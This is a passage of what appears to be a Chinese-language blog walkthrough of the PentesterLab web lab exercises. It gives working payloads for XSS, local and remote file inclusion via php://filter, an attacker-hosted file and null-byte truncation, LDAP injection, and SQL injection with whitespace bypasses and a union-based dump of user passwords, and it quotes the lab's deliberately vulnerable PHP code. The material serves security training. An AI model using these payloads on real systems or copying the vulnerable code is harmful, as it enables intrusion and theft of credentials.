class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example7.php?name=%<span class="hljs-number">27</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-regexp">//</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h4><p>发现这关有个输入框，提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现返回了实体编码</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELLO <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/xss/example8.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span></span><br><span class="line">  Your name:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> /&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>尝试了一些特殊字符</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">()/'";<span class="hljs-tag">&lt;&gt;</span>`</span><br><span class="line"></span><br><span class="line">HELLO ()/'<span class="hljs-symbol">&amp;quot;</span>;<span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span>`</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现<code>&lt;&gt;</code>被过滤了，但是输出结果又没有处于任何一个标签的属性之内，感觉没有什么攻击点，查看源代码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'name'</span>])){</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"HELLO "</span>.htmlentities($_POST[<span class="hljs-string">'name'</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>确实用了<code>htmlentities</code>，但是感觉在输出又处在内容当中，真的没什么利用的点，找了一波也没发现什么有用的利用姿势，最后看文档，才知道攻击点并不在这，而是在后面的代码中</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action="&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;" method="POST"&gt;</span><br><span class="line">  Your name:&lt;input type="text" name="name" /&gt;</span><br><span class="line">  &lt;input type="submit" name="submit"/&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>问题就出现在<code>&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;</code>这里</p><blockquote><p>​ ‘PHP_SELF’</p><p>当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/foo/bar.php" target="_blank" rel="noopener">http://example.com/foo/bar.php</a> 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 /foo/bar.php。<a href="http://php.net/manual/zh/language.constants.predefined.php" target="_blank" rel="noopener"><strong>FILE</strong></a> 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</p></blockquote><p>我们可以看到，这里是获取执行脚本的文件名，我们可以有<code>xss/example8.php/%3C</code>，返回</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/xss/example8.php/&lt;"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>说明<code>PHP_SELF</code>是可控的，而且又存在在<code>action</code>属性中，于是我们可以有，直接闭合<code>form</code>，然后直接 x</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xss/</span>example9.php<span class="hljs-comment">#hacker</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>发现页面有</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">document</span>.write(location.hash.substring(<span class="hljs-number">1</span>));</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>一个 DOM 型的 XSS ，讲道理应该可以直接使用<code>#&lt;script&gt;alert(1)&lt;/script&gt;</code>来进行 xss ，但是…不知道是不是浏览器的问题，直接就给我把<code>&lt;&gt;</code>进行 url 编码了…</p><h3 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h3><h4 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h4><p>直接用</p><p></p><figure class="highlight livecodeserver hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=intro.php</span><br><span class="line">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=example1.php</span><br></pre></td></tr></tbody></table></figure><p></p><p>得到源码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">'../header.php'</span>; <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">true<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">"page"</span>]) {</span><br><span class="line">truetrue<span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">"page"</span>]);</span><br><span class="line">true} </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">'../footer.php'</span>; <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是官方的意思是让我们体验一下远程包含的感觉…</p><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/fileincl/</span>example1.php?page=http:<span class="hljs-regexp">//y</span>our_ip<span class="hljs-regexp">/zedd.txt</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Zedd.txt 中的内容为</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br></pre></td></tr></tbody></table></figure><p></p><p>得到</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005160.jpg" alt=""></p><h4 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h4><p>比上面少个后缀</p><p></p><figure class="highlight livecodeserver hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=intro</span><br><span class="line">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=example2</span><br></pre></td></tr></tbody></table></figure><p></p><p>读取源代码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">'../header.php'</span>; <span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">true<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">"page"</span>]) {</span><br><span class="line">    $file = $_GET[<span class="hljs-string">"page"</span>].<span class="hljs-string">".php"</span>;</span><br><span class="line">    <span class="hljs-comment">// simulate null byte issue</span></span><br><span class="line">    $file = preg_replace(<span class="hljs-string">'/\x00.*/'</span>,<span class="hljs-string">""</span>,$file);</span><br><span class="line">truetrue<span class="hljs-keyword">include</span>($file);</span><br><span class="line">true} </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">'../footer.php'</span>; <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以利用<code>zedd.txt%00</code>来绕过</p><h3 id="LDAP-attacks"><a href="#LDAP-attacks" class="headerlink" title="LDAP attacks"></a>LDAP attacks</h3><h4 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h4><p>着实没看懂这个 Example 是什么鬼…</p><blockquote><p>​ In this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid.</p><p>However, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the <code>bind</code> with 2 null values, you will need to completely remove this parameter from the query. If you keep something like <code>username=&amp;password=</code> in the URL, these values will not work, since they won’t be null; instead, they will be empty.</p></blockquote><p>菜是越来越菜，整个意思就是说可以用空值绕过，就是直接访问<code>http://172.16.71.152/ldap/example1.php</code>即可…</p><h4 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h4><p>按照 Example 1 的套路，先直接访问看看，发现返回</p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">Notice</span>: Undefined <span class="hljs-keyword">index</span>: <span class="hljs-keyword">password</span> <span class="hljs-keyword">in</span> /var/www/ldap/example2.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">9</span> <span class="hljs-keyword">Notice</span>: Undefined <span class="hljs-keyword">index</span>: <span class="hljs-type">name</span> <span class="hljs-keyword">in</span> /var/www/ldap/example2.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">10</span> UNAUTHENTICATED</span><br></pre></td></tr></tbody></table></figure><p></p><p>看来是个正经的注入题了，</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">  <span class="hljs-keyword">require</span> <span class="hljs-string">"../header.php"</span> ; </span><br><span class="line">  $ld = ldap_connect(<span class="hljs-string">"localhost"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Could not connect to LDAP server"</span>);</span><br><span class="line">  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, <span class="hljs-number">3</span>); </span><br><span class="line">  ldap_set_option($ld, LDAP_OPT_REFERRALS, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ($ld) {</span><br><span class="line">   $lb = @ldap_bind($ld, <span class="hljs-string">"cn=admin,dc=pentesterlab,dc=com"</span>, <span class="hljs-string">"pentesterlab"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($lb) {</span><br><span class="line">      $pass = <span class="hljs-string">"{MD5}"</span>.base64_encode(pack(<span class="hljs-string">"H*"</span>,md5($_GET[<span class="hljs-string">'password'</span>])));</span><br><span class="line">      $filter = <span class="hljs-string">"(&amp;(cn="</span>.$_GET[<span class="hljs-string">'name'</span>].<span class="hljs-string">")(userPassword="</span>.$pass.<span class="hljs-string">"))"</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> (!($search=@ldap_search($ld, <span class="hljs-string">"ou=people,dc=pentesterlab,dc=com"</span>, $filter))) {</span><br><span class="line">      <span class="hljs-keyword">echo</span>(<span class="hljs-string">"Unable to search ldap server&lt;br&gt;"</span>);</span><br><span class="line">      <span class="hljs-keyword">echo</span>(<span class="hljs-string">"msg:'"</span>.ldap_error($ld).<span class="hljs-string">"'&lt;/br&gt;"</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">      $number_returned = ldap_count_entries($ld,$search);</span><br><span class="line">      $info = ldap_get_entries($ld, $search);</span><br><span class="line">      <span class="hljs-keyword">if</span> ($info[<span class="hljs-string">"count"</span>] &lt; <span class="hljs-number">1</span>) {</span><br><span class="line">         <span class="hljs-comment">//NOK </span></span><br><span class="line">         <span class="hljs-keyword">echo</span> <span class="hljs-string">"UNAUTHENTICATED"</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AUTHENTICATED as"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span>(<span class="hljs-string">" "</span>.htmlentities($info[<span class="hljs-number">0</span>][<span class="hljs-string">'uid'</span>][<span class="hljs-number">0</span>]));</span><br><span class="line">      }	</span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">require</span> <span class="hljs-string">"../footer.php"</span> ; </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>折腾了挺久，这里直接看源码，我们对着分析，因为<code>password</code>处是被<code>md5</code>处理了，所以后面我们没办法注入，这里他执行两条以上的语句会直接报错<code>Bad search filter</code>，不能像网上给的大多数 payload 一样直接执行，所以我们需要分析一下，可以在<code>name</code>处闭合前面的括号，再用<code>%00</code>截断后面的即可，</p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">admin</span>)(cn=<span class="hljs-keyword">admin</span>))%<span class="hljs-number">00</span>&amp;<span class="hljs-keyword">password</span>=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>也可以不用后面那个<code>cn=admin</code></p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">admin</span>))%<span class="hljs-number">00</span>&amp;<span class="hljs-keyword">password</span>=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>不过我看文档写的有一处 fuzz 还是比较好的：</p><blockquote><ul><li>首先先用<code>name=hacker&amp;password=hacker</code>，回显正常</li><li>接着用<code>name=hack*&amp;password=hacker</code>，回显也正常</li><li>尝试<code>name=hacker&amp;password=hack*</code>，不能认证</li><li>尝试<code>name=hack*&amp;password=hack*</code>，不能认证</li></ul><p>从这里可以推断，<code>password</code>处可能是经过了 Hash 或者一些什么操作，我们的注入点只能在<code>username</code>处</p></blockquote><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><h4 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h4><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root' or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>没啥好说的</p><h4 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example 2"></a>Example 2</h4><p>尝试<code>root' or 1=1%23</code>，返回</p><p></p><figure class="highlight subunit hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ERROR </span>NO SPACE</span><br></pre></td></tr></tbody></table></figure><p></p><p>直接用<code>%0a</code>绕</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root'%<span class="hljs-number">0</span>Aor%<span class="hljs-number">0</span>A1=<span class="hljs-number">1</span>%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-3-1"><a href="#Example-3-1" class="headerlink" title="Example 3"></a>Example 3</h4><p><code>%0a</code>还是返回了</p><p></p><figure class="highlight subunit hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ERROR </span>NO SPACE</span><br></pre></td></tr></tbody></table></figure><p></p><p>用<code>%a0</code>绕</p><p></p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>A<span class="hljs-number">0</span><span class="hljs-keyword">or</span><span class="hljs-meta">%</span>A<span class="hljs-number">01</span>=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-4-1"><a href="#Example-4-1" class="headerlink" title="Example 4"></a>Example 4</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/sqli/</span>example4.php?id=<span class="hljs-number">2</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里参数变成了 id ，猜测是整形注入</p><p></p><figure class="highlight basic hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">2 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-5-1"><a href="#Example-5-1" class="headerlink" title="Example 5"></a>Example 5</h4><p>依旧可以使用<code>2 or 1=1%23</code>注入</p><p>看了一下代码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^[0-9]+/'</span>, $_GET[<span class="hljs-string">"id"</span>])) {</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR INTEGER REQUIRED"</span>);	</span><br><span class="line">}</span><br><span class="line">$sql = <span class="hljs-string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="hljs-string">"id"</span>] ;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></tbody></table></figure><p></p><p>只要开头是数字就可以绕过了</p><h4 id="Example-6-1"><a href="#Example-6-1" class="headerlink" title="Example 6"></a>Example 6</h4><p>尝试<code>2 or 1=1%23</code>，返回</p><p></p><figure class="highlight subunit hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ERROR </span>INTEGER REQUIRED</span><br></pre></td></tr></tbody></table></figure><p></p><p>尝试<code>2 or 1=1</code>，发现全部返回，猜测检测开头结尾是否为数字，于是我们可以使用布尔盲注</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'i'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>结果发现可以直接在注释后加数字就好了<code>2 or 1=1 %23 1</code>，而且之前猜列数为 3 ，也猜错了…orz</p><p>还是不够细心，通过<code>1 union select 1,2,3,4,5%23 1</code>，得到 5 列</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1 union <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.schemata %<span class="hljs-number">23</span> <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">information_schema,exercises</span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'exercises'</span> %<span class="hljs-number">23</span> <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span>%<span class="hljs-number">23</span> <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,age,groupid,passwd</span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> %<span class="hljs-number">23</span> <span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-7-1"><a href="#Example-7-1" class="headerlink" title="Example 7"></a>Example 7</h4><p>查看源代码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 